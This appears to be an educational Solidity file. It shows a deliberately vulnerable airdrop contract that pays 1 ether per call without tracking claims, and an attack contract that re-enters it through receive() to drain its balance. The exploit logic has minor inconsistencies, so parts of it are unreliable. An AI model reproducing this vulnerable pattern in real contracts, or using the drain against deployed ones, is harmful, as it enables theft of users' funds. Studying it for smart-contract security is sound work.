pragma solidity ^0.8.20;


interface IEthAirdropper {
    function claimAirdrop() external payable;
}

/*//=================////
///vulnerable contract///
///===================///*/
contract EthAirdropper {
    uint256 claimable = 1 ether;
    function claimAirdrop() external {
        require(0 < address(msg.sender).balance); //<<<<========wrong use of require/////
        (bool sent, ) = msg.sender.call{value: claimable}("");
        require(sent, "failed to send ETH");
    }
}

/*//=================////
///Attack contract///
///===================///*/
contract AirdropExploit {
    IEthAirdropper public ethAirdropper;

    constructor(address _ethAirdropper) {
        ethAirdropper = IEthAirdropper(_ethAirdropper);
    }

    receive() external payable {
        if (address(ethAirdropper).balance >= 1) {
            ethAirdropper.claimAirdrop();
        }
    }

    function exploit() external payable {
        ethAirdropper.claimAirdrop();
        payable(msg.sender).transfer(address(this).balance);
    }
}